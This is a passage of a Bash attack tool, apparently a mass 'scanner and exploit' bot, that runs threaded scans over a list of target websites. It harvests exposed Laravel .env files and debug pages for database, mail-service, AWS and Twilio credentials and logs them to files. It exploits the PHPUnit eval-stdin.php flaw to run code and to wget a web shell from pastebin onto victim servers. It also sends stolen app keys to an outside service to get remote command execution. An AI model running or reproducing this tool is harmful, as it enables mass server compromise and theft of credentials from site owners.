				 laravel="$okegreen[Laravel Cookie]"
				 echo "$target" >> Resultbot/laravel.txt
			   else
				 laravel="$red[Laravel Cookie]"
			   fi
			   if [[ $debug =~ '<td>MAIL_HOST</td>' ]];
			   then
				 deb="${okegreen}[Debug]"
				 echo "$target" >> Resultbot/debug.txt
			   else
				 deb="${red}[Debug]"
			   fi
			   if [[ $check =~ 'MAIL_HOST' ]];
			   then
				 en="${okegreen}[Env]"
				 echo "$target/.env" >> Resultbot/env.txt
			   else
				 en="${red}[Env]"
			   fi
		    }
		  bann(){
			 read -p "target list : " targetnya;
			 read -p "THREADS : " THREADS;
		    }
		  bann
		  checksite(){
			 scanner $target
			 echo -e "$cyan[$target] => $deb $en $red|$cyan CMS : $word $jom $drup $laravel"
		    }
		  for target in $(cat $targetnya);
		    do
			 FAST=$(expr $CON % $THREADS)
			 if [[ $FAST == 0 && $CON > 0 ]];
			 then
				 sleep 5
			  fi
			 checksite &
			 CON=$[$CON+1]
		  done
		  wait
	      ;;

	     "Scanner And Exploit Env")
		  CON=$((COUNTER+1))
		  envir(){
			 check=$(curl -s --connect-timeout 30 "${target}/.env" -L | tr -d "\0")
			 phpmyadmin=$(curl -kLs "${target}/phpmyadmin/" | tr -d "\0")
			 e=$(curl -s -d "<?php echo "cakil"; ?>" "${target}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" | tr -d "\0")
			 adm=$(curl -kLs "${target}/adminer.php" | tr -d "\0")
			 if [[ $check =~ 'DB_USER' || $check =~ 'DB_NAME' || $check =~ 'DB_PASSWORD' || $check =~ 'DB_HOST' ]];
			 then
				 host=$(echo $check | grep -oP "DB_HOS(.*?)=(.*?)\K[^ ]+")
				 name=$(echo $check | grep -oP "DB_NAM(.*?)=(.*?)\K[^ ]+")
				 name=$(echo $check | grep -oP "DB_DATABAS(.*?)=(.*?)\K[^ ]+")
				 user=$(echo $check | grep -oP "DB_USE(.*?)=(.*?)\K[^ ]+")
				 user=$(echo $check | grep -oP "DB_USERNAM(.*?)=(.*?)\K[^ ]+")
				 password=$(echo $check | grep -oP "DB_PASSWOR(.*?)=(.*?)\K[^ ]+")
				 db="${okegreen}[ConfigDB]"
				 echo "[Site : $target] [HOST : $host] [DBNAME : $name] [DBUSER : $user] [DBPASSWORD : $password]" >> Resultbot/resultDB.txt
			  else
				 db="${red}[ConfigDB]"
			   fi
			 if [[ $check =~ 'TWILIO_SID' || $check =~ 'TWILIO' ]];
			 then
				 twilid=$(echo $check | grep -oP "TWILIO_SI(.*?)=(.*?)\K[^ ]+")
				 twiltok=$(echo $check | grep -oP "TWILIO_TOKE(.*?)=(.*?)\K[^ ]+")
				 twilfrom=$(echo $check | grep -oP "TWILIO_FRO(.*?)=(.*?)\K[^ ]+")
				 twilio="${okegreen}[TWILIO]"
				 echo "[Site : $target] [TWILIO_SID : $twilid] [TWILIO_TOKEN : $twiltok] [TWILIO_FROM : $twilfrom]" >> Resultbot/Twilio.txt
				 echo "$twilid|$twiltok|$twilfrom" >> Resultbot/TwilioSplit.txt
			  else
				 twilio="${red}[TWILIO]"
			   fi

			  if [[ $check =~ 'APP_NAME' || $check =~ 'APP_ENV' || $check =~ 'APP_KEY' ]];
			  then
				 appname=$(echo $check | grep -oP "APP_NAM(.*?)=(.*?)\K[^ ]+")
				 app=$(echo $check | grep -oP "APP_EN(.*?)=(.*?)\K[^ ]+")
				 key=$(echo $check | grep -oP "APP_KE(.*?)=(.*?)\K[^ ]+")

				 c="${okegreen}[AppKey]"
				 echo "$target|$key" >> Resultbot/resultAPPkey.txt
				 rce=$(curl -s -X POST -d "url=$target&app_key=$key&command=echo 'cakil'" https://tools.xploitsecid.or.id/api/env.php)

				 if [[ $rce =~ 'cakil' ]];
				 then
					 rcenya=$(curl -s --connect-timeout 30 -X POST -d "url=$target&app_key=$key&command=id;uname -a" https://tools.xploitsecid.or.id/api/env.php)
					 if [[ $rcenya =~ 'uid' ]];
					 then
						 apprce="${okegreen}[AppKeyRce]"
						 apprcek="${okegreen}\n$(echo "Kernel : $rcenya" | tr -d "\n")"
						 echo "[AppKeyRce] : $target|$key => Kernel : $rcenya" >> Resultbot/resultAPPkeyRce.txt
					  else
						 apprce="${red}[AppKeyRce]"
					   fi
				  else
					 apprce="${red}[AppKeyRce]"
				   fi
			  else
				 c="${red}[AppKey]"
				 apprce="${red}[AppKeyRce]"
			   fi

			  if [[ $check =~ 'mailgun.org' ]];
			  then
				 mailgun=$(echo $check | grep -oP "MAIL_DRIVE(.*?)=(.*?)\K[^ ]+")
				 mailgunhost=$(echo $check | grep -oP "MAIL_HOS(.*?)=(.*?)\K[^ ]+")
				 mailgunport=$(echo $check | grep -oP "MAIL_POR(.*?)=(.*?)\K[^ ]+")
				 mailgunuser=$(echo $check | grep -oP "MAIL_USERNAM(.*?)=(.*?)\K[^ ]+")
				 mailgunpass=$(echo $check | grep -oP "MAIL_PASSWOR(.*?)=(.*?)\K[^ ]+")
				 mailgunfrom=$(echo $check | grep -oP "MAIL_FROM_ADDRES(.*?)=(.*?)\K[^ ]+")

				 if [[ $mailgunfrom =~ '@' ]];
				 then
					 gun="${okegreen}[MailGun]"
					 echo "[SITE : $target] [MAIL_DRIVER : $mailgun] : $mailgunhost|$mailgunport|$mailgunuser|$mailgunpass|$mailgunfrom" >> Resultbot/Mailgun.txt
				 else
					 gun="${okegreen}[MailGun]"
					 echo "[SITE : $target] [MAIL_DRIVER : $mailgun] : $mailgunhost|$mailgunport|$mailgunuser|$mailgunpass|unknown@unknown.com" >> Resultbot/MailgunUnknownFrom.txt
				   fi
			  else
				 gun="${red}[MailGun]"
			   fi

			  if [[ $check =~ 'NEXMO_KEY' ]];
			  then
				 nexkey=$(echo $check | grep -oP 'NEXMO_KE(.*?)=(.*?)\K[^ ]+')
				 nexsec=$(echo $check | grep -oP 'NEXMO_SECRE(.*?)=(.*?)\K[^ ]+')
				 nexnum=$(echo $check | grep -oP 'NEXMO_NUMBE(.*?)=(.*?)\K[^ ]+')
				 nexmo="${okegreen}[Nexmo]"
				 echo "[SITE : $target]: $nexkey|$nexsec|$nexnum" >> Resultbot/Nexmo.txt
			  else
				 nexmo="${red}[Nexmo]"
			   fi

			  if [[ $check =~ 'sendgrid' ]]
			  then
				 sendgrid=$(echo $check | grep -oP "MAIL_DRIVE(.*?)=(.*?)\K[^ ]+")
				 sendgridhost=$(echo $check | grep -oP "MAIL_HOS(.*?)=(.*?)\K[^ ]+")
				 sendgridport=$(echo $check | grep -oP "MAIL_POR(.*?)=(.*?)\K[^ ]+")
				 sendgriduser=$(echo $check | grep -oP "MAIL_USERNAM(.*?)=(.*?)\K[^ ]+")
				 sendgridpass=$(echo $check | grep -oP "MAIL_PASSWOR(.*?)=(.*?)\K[^ ]+")
				 sendgridfrom=$(echo $check | grep -oP "MAIL_FROM_ADDRES(.*?)=(.*?)\K[^ ]+")
				 if [[ $sendgridfrom =~ '@' ]];
				 then
					 grid="${okegreen}[Sendgrid]"
					 echo "[SITE : $target] [MAIL_DRIVER : $sendgrid] : $sendgridhost|$sendgridport|$sendgriduser|$sendgridpass|$sendgridfrom" >> Resultbot/Sendgrid.txt
				 else
					 grid="${okegreen}[Sendgrid]"
					 echo "[SITE : $target] [MAIL_DRIVER : $sendgrid] : $sendgridhost|$sendgridport|$sendgriduser|$sendgridpass|unknown@unknown.com" >> Resultbot/SendgridUnknownFrom.txt
				   fi
			  else
				 grid="${red}[Sendgrid]"
			   fi

			  if [[ $check =~ 'smtp.office' ]];
			  then
				 office=$(echo $check | grep -oP "MAIL_DRIVE(.*?)=(.*?)\K[^ ]+")
				 officehost=$(echo $check | grep -oP "MAIL_HOS(.*?)=(.*?)\K[^ ]+")
				 officeport=$(echo $check | grep -oP "MAIL_POR(.*?)=(.*?)\K[^ ]+")
				 officeuser=$(echo $check | grep -oP "MAIL_USERNAM(.*?)=(.*?)\K[^ ]+")
				 officepass=$(echo $check | grep -oP "MAIL_PASSWOR(.*?)=(.*?)\K[^ ]+")
				 officefrom=$(echo $check | grep -oP "MAIL_FROM_ADDRES(.*?)=(.*?)\K[^ ]+")

				 if [[ $officefrom =~ '@' ]];
				 then
					 offices="${okegreen}[Office]"
					 echo "$target|$office : $officehost|$officeport|$officeuser|$officepass|$officefrom" >> Resultbot/office.txt
					 echo "$officehost|$officeport|$officeuser|$officepass|$officefrom" >> Resultbot/officeSplit.txt
				 else
					 offices="${okegreen}[Office]"
					 echo "$target|$office : $officehost|$officeport|$officeuser|$officepass|unknown@unknown.com" >> Resultbot/officeUnknownFrom.txt
					 echo "$officehost|$officeport|$officeuser|$officepass|unknown@unknown.com" >> Resultbot/officeUnknownSplit.txt
				   fi
			  else
				 offices="${red}[Office]"
			   fi

			  if [[ $check =~ 'MAIL_DRIVER' || $check =~ 'MAIL_HOST' || $check =~ 'MAIL_PORT' || $check =~ 'MAIL_USERNAME' || $check =~ 'MAIL_PASSWORD' ]];
			  then
				 mail=$(echo $check | grep -oP "MAIL_DRIVE(.*?)=(.*?)\K[^ ]+")
				 mailhost=$(echo $check | grep -oP "MAIL_HOS(.*?)=(.*?)\K[^ ]+")
				 mailport=$(echo $check | grep -oP "MAIL_POR(.*?)=(.*?)\K[^ ]+")
				 mailuser=$(echo $check | grep -oP "MAIL_USERNAM(.*?)=(.*?)\K[^ ]+")
				 mailpass=$(echo $check | grep -oP "MAIL_PASSWOR(.*?)=(.*?)\K[^ ]+")
				 mailfrom=$(echo $check | grep -oP "MAIL_FROM_ADDRES(.*?)=(.*?)\K[^ ]+")

				 if [[ $mailuser =~ 'null' || $mailpass =~ 'null' ]];
				 then
					 smtp="${red}[SMTP]"
				 else
					 if [[ $mailfrom =~ '@' ]];
					 then
						 smtp="${okegreen}[SMTP]"
						 echo "[SITE : $target] [MAIL_DRIVER : $mail] : $mailhost|$mailport|$mailuser|$mailpass|$mailfrom" >> Resultbot/valiFromSmtp.txt
						 echo "$mailhost|$mailport|$mailuser|$mailpass|$mailfrom" >> Resultbot/valiFromSmtpSplit.txt
					 else
						 smtp="${okegreen}[SMTP]"
						 echo "[SITE : $target] [MAIL_DRIVER : $mail] : $mailhost|$mailport|$mailuser|$mailpass|unknown@unknown.com" >> Resultbot/randomSMTP.txt
						 echo "$mailhost|$mailport|$mailuser|$mailpass|unknown@unknown.com" >> Resultbot/randomSMTPSplit.txt
					   fi
				   fi
			  else
				 smtp="${red}[SMTP]"
			   fi

			  if [[ $check =~ 'AWS_ACCESS_KEY_ID=' || $check =~ 'AWS_SECRET_ACCESS_KEY=' || $check =~ 'AWS_DEFAULT_REGION=' || $check =~ 'AWS_BUCKET=' ]];
			  then
				 access=$(echo $check | grep -oP "AWS_ACCESS_KEY_(.*?)=(.*?)\K[^ ]+")
				 secret=$(echo $check | grep -oP "AWS_SECRET_ACCESS_(.*?)=(.*?)\K[^ ]+")
				 region1=$(echo $check | grep -oP "AWS_REGIO(.*?)=(.*?)\K[^ ]+")
				 region=$(echo $check | grep -oP "AWS_DEFAULT_REGIO(.*?)=(.*?)\K[^ ]+")
				 bucket=$(echo $check | grep -oP "AWS_BUCKE(.*?)=(.*?)\K[^ ]+")

				 if [[ $access =~ "AKIA" ]];
				 then
					 if [[ $region1 =~ '-' ]];
					 then
						 aws="${okegreen}[AWS]"
						 echo "[SITE : $target] [AWS_ACCESS_KEY_ID : $access][AWS_SECRET_ACCESS_KEY : $secret][AWS_DEFAULT_REGION : $region][AWS_REGION : $region1][AWS_BUCKET : $bucket]" >> Resultbot/aws.txt
						 echo "$access|$secret|$region1" >> Resultbot/awsSplit.txt
					   fi
					 if [[ $region =~ '-' ]];
					 then
						 aws="${okegreen}[AWS]"
						 echo "[SITE : $target] [AWS_ACCESS_KEY_ID : $access][AWS_SECRET_ACCESS_KEY : $secret][AWS_DEFAULT_REGION : $region][AWS_REGION : $region1][AWS_BUCKET : $bucket]" >> Resultbot/aws.txt
						 echo "$access|$secret|$region" >> Resultbot/awsSplit.txt
					   fi
				 else
					 aws="${red}[AWS]"
				   fi
			  else
				 aws="${red}[AWS]"
			   fi

			 if [[ $phpmyadmin =~ 'pma_username' ]];
			 then
				 admin="${okegreen}[PHPMYADMIN]"
				 echo "[SITE : $target] => $target/phpmyadmin/ | [Login : $user|$password]" >> Resultbot/phpmyadmin.txt
			  else
				 admin="${red}[PHPMYADMIN]"
			   fi

			 if [[ $adm =~ 'Login - Adminer' ]];
			 then
				 adminer="${okegreen}[Adminer]"
				 echo "[SITE : $target] => $target/adminer.php | [Login : $host|$user|$password|$name]" >> Resultbot/adminer.txt
			  else
				 adminer="${red}[Adminer]"
			   fi

			 if [[ $e =~ 'POST Data' || $e =~ 'html' || $e =~ 'php_uname' ]];
			 then
				 exploit="${red}[phpunit]"
			 else
				 if [[ $e =~ 'cakil' ]];
				 then
					 kernel=$(curl -s -d "<?php echo php_uname(); ?>" "${target}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" | tr -d "\0")
					 upshell=$(curl -s -d "<?php echo passthru('wget https://pastebin.com/raw/r4VVKR3f -O cakil.php;ls'); ?>" "${target}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" | tr -d "\0")
					 exploit="${okegreen}[phpunit]"
					 echo "[SITE : $target/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php|Kernel : $kernel] [Vuln]" >> Resultbot/vuln.txt
					 if [[ $upshell =~ 'cakil.php' ]];
					 then
						 exploited="${okegreen}[exploited]"
						 echo "[Uploader : $target/vendor/phpunit/phpunit/src/Util/PHP/cakil.php]" >> Resultbot/vuln.txt
					   fi
				  else
					 exploit="${red}[phpunit]"
				   fi
			   fi
		    }
		 checksite(){
			 envir $target
			 echo -e "$cyan[$target] => $db $c $smtp $aws $admin $adminer $twilio $gun $grid $offices $nexmo $apprce $exploit $exploited $apprcek"
		    }
		 ban(){
			 read -p "target list : " targetnya;
			 read -p "THREADS : " THREADS;
		    }
		 ban
		 for target in $(cat $targetnya);
		   do
			 FAST=$(expr $CON % $THREADS)
			 if [[ $FAST == 0 && $CON > 0 ]];
			 then
				 sleep 5
			   fi
			   checksite &
			   CON=$[$CON+1]
		   done
		   wait
		   db=$(cat Resultbot/resultDB.txt | wc -l)
		   keynya=$(cat Resultbot/resultAPPkey.txt | wc -l)
		   smtp=$(cat Resultbot/randomSMTP.txt | wc -l)
		   printf "${cyan}ConfigDB : $db\n";
		   printf "${cyan}APP KEY : $keynya\n";
		   printf "${cyan}SMTP : $smtp\n";
	     ;;

	     "Scanner And Exploit Debug")
		 CON=$((COUNTER+1))
		 scanner(){
			 curlvar=$(curl -s -d '"0x[]":"MrcakilB0t"' "$target" -L | tr -d "\0")
			 phpmyadmin=$(curl -kLs "${target}/phpmyadmin/" | tr -d "\0")
			 adm=$(curl -kLs "${target}/adminer.php" | tr -d "\0")

			 if [[ $curlvar =~ '<td>MAIL_HOST</td>' ]];
			 then
				 host=$(echo $curlvar | grep -oP '<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>' | cut -d ">" -f6 | cut -d "<" -f1)
				 port=$(echo $curlvar | grep -oP '<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>' | cut -d ">" -f6 | cut -d "<" -f1)
				 user=$(echo $curlvar | grep -oP '<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>' | cut -d ">" -f6 | cut -d "<" -f1)
				 pass=$(echo $curlvar | grep -oP '<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>' | cut -d ">" -f6 | cut -d "<" -f1)
				 from=$(echo $curlvar | grep -oP '<td>MAIL_FROM_ADDRES<\/td>\s+<td><pre.*>(.*?)<\/span>' | cut -d ">" -f6 | cut -d "<" -f1)
				 if [[ $user =~ 'null' || $pass =~ 'null' ]];
				 then
					 smtp="${red}[SMTP]"
				 else
					 smtp="${okegreen}[SMTP]"
					 echo "smtp : $host|$port|$user|$pass|$from" >> Resultbot/smtpdebug.txt
				   fi
			 else
				 smtp="${red}[SMTP]"
			   fi

			 if [[ $curlvar =~ '<td>DB_HOST</td>' ]];
			 then
				 dbhost=$(echo $curlvar | grep -oP '<td>DB_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>' | cut -d ">" -f6 | cut -d "<" -f1)
				 dbport=$(echo $curlvar | grep -oP '<td>DB_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>' | cut -d ">" -f6 | cut -d "<" -f1)
				 dbdata=$(echo $curlvar | grep -oP '<td>DB_DATABASE<\/td>\s+<td><pre.*>(.*?)<\/span>' | cut -d ">" -f6 | cut -d "<" -f1)
				 dbuser=$(echo $curlvar | grep -oP '<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>' | cut -d ">" -f6 | cut -d "<" -f1)
				 dbpass=$(echo $curlvar | grep -oP '<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>' | cut -d ">" -f6 | cut -d "<" -f1)
				 if [[ $dbuser =~ 'null' || $dbpass =~ 'null' ]];
				 then
					 db="${red}[DATABASE]"
				 else
					 db="${okegreen}[DATABASE]"
					 echo "Database : $dbhost|$dbport|$dbdata|$dbuser|$dbpass" >> Resultbot/database.txt
				   fi
			 else
				 db="${red}[DATABASE]"
			   fi

			 if [[ $curlvar =~ '<td>TWILIO_ACCOUNT_SID</td>' ]];
			 then
				 sid=$(echo $curlvar | grep -oP '<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>' | cut -d ">" -f6 | cut -d "<" -f1)
				 apikey=$(echo $curlvar | grep -oP '<td>TWILIO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>' | cut -d ">" -f6 | cut -d "<" -f1)
				 appsec=$(echo $curlvar | grep -oP '<td>TWILIO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>' | cut -d ">" -f6 | cut -d "<" -f1)
				 chatsid=$(echo $curlvar | grep -oP '<td>TWILIO_CHAT_SERVICE_SID<\/td>\s+<td><pre.*>(.*?)<\/span>' | cut -d ">" -f6 | cut -d "<" -f1)
				 num=$(echo $curlvar | grep -oP '<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>' | cut -d ">" -f6 | cut -d "<" -f1)
				 tok=$(echo $curlvar | grep -oP '<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>' | cut -d ">" -f6 | cut -d "<" -f1)
				 twil="${okegreen}[Twilio]"
				 echo "Twilio : $sid|$apikey|$appsec|$chatsid|$num|$tok" >> Resultbot/twiliodebug.txt
			 else
				 twil="${red}[Twilio]"
			   fi

			 if [[ $curlvar =~ '<td>SES_KEY</td>' ]];
			 then
				 seskey=$(echo $curlvar | grep -oP '<td>SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>' | cut -d ">" -f6 | cut -d "<" -f1)
				 sessec=$(echo $curlvar | grep -oP '<td>SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>' | cut -d ">" -f6 | cut -d "<" -f1)
				 ses="${okegreen}[Session]"
				 echo "$seskey|$sessec" >> Resultbot/session.txt
			 else
				 ses="${red}[Session]"
			   fi

			 if [[ $curlvar =~ '<td>AWS_ACCESS_KEY_ID</td>' ]];
			 then
				 if [[ $curlvar =~ 'AWS_DEFAULT_REGION' ]];
				 then
					 awskey=$(echo $curlvar | grep -oP '<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>' | cut -d ">" -f6 | cut -d "<" -f1)
					 awssecret=$(echo $curlvar | grep -oP '<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>' | cut -d ">" -f6 | cut -d "<" -f1)
					 default=$(echo $curlvar | grep -oP '<td>AWS_DEFAULT_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>' | cut -d ">" -f6 | cut -d "<" -f1)
					 aws="${okegreen}[AWS]"
					 echo "$awskey|$awssecret|$default" >> Resultbot/aws_default_region_debug.txt
				 else
					 awskey=$(echo $curlvar | grep -oP '<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>' | cut -d ">" -f6 | cut -d "<" -f1)
					 awssecret=$(echo $curlvar | grep -oP '<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>' | cut -d ">" -f6 | cut -d "<" -f1)
					 region=$(echo $curlvar | grep -oP '<td>AWS_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>' | cut -d ">" -f6 | cut -d "<" -f1)
					 aws="${okegreen}[AWS]"
					 echo "$awskey|$awssecret|$region" >> Resultbot/awsdebug.txt
				 fi
			 else
				 aws="${red}[AWS]"
			   fi

			 if [[ $phpmyadmin =~ 'pma_username' ]];
			 then
				 admin="${okegreen}[PHPMYADMIN]"
				 echo "[SITE : $target] => $target/phpmyadmin/ | [Login : $dbuser|$dbpass]" >> Resultbot/phpmyadmin.txt
			  else
				 admin="${red}[PHPMYADMIN]"
			   fi

			 if [[ $adm =~ 'Login - Adminer' ]];
			 then
				 adminer="${okegreen}[Adminer]"
				 echo "[SITE : $target] => $target/adminer.php | [Login : $dbhost|$dbuser|$dbpass|$dbdata" >> Resultbot/adminer.txt
			 else
				 adminer="${red}[Adminer]"
			   fi
		    }

		 ban(){
			 read -p "target list : " targetnya;
			 read -p "THREADS : " THREADS;
		    }
		 ban

		 checksite(){
			 scanner $target
			 echo -e "$cyan[$target] => $smtp $db $twil $ses $aws $admin $adminer"
		    }

		 for target in $(cat $targetnya);
		   do
			 FAST=$(expr $CON % $THREADS)
			 if [[ $FAST == 0 && $CON > 0 ]];
			 then
				 sleep 5
			   fi
			 checksite &
			 CON=$[$CON+1]
		  done
		  wait
	      ;;

         "back")
		 bash premium.sh rizki1337
	     ;;
        *)
       echo "[*] Masukin Command Yang bener cok!"
       esac
       done
       ;;
       "Special Bot $(echo -e "$red[Comingsoon]$yellow")")
       echo "Comingsoon"
       ;;
    *) echo "[*] Masukin Command Yang bener cok!"
esac
done